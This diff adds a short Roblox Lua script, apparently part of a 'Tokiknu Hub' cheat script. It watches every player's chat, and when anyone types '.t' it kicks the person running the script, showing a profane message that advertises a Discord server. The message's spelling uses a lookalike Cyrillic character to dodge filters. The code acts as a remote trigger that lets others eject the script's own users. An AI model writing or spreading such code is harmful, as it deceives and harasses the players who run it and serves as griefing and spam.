@@ -1,0 +1,18 @@
+-- type .t to bomb the person lmao
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg)
+        if msg == ".t" then
+            -- Kick the local player (you)
+            game.Players.LocalPlayer:Kick("fuсk3d by Tokiknu Hub - .gg/YVJgMWK92k")
+        end
+    end)
+end)
+
+-- Also connect to players who are already in the game
+for _, player in pairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg)
+        if msg == ".t" then
+            game.Players.LocalPlayer:Kick("fuсk3d by Tokiknu Hub - .gg/YVJgMWK92k")
+        end
+    end)
+end
